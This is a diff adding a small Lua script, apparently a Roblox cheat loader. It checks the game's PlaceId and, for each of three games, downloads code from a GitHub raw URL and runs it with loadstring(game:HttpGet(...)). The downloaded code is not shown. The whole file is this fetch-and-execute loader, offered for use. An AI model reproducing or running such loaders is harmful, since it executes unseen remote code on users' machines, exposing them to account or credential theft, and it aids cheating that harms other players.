@@ -1,0 +1,7 @@
+if game.PlaceId == 6299805723 then
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/DemonMan96/hfbab/main/nibro'))()
+elseif game.PlaceId == 537413528 then
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/DemonMan96/babftgood/main/omgtbaft'))()
+elseif game.PlaceId == 2788229376 then
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/DemonMan96/djfopwow/main/thisthe1X'))()
+end
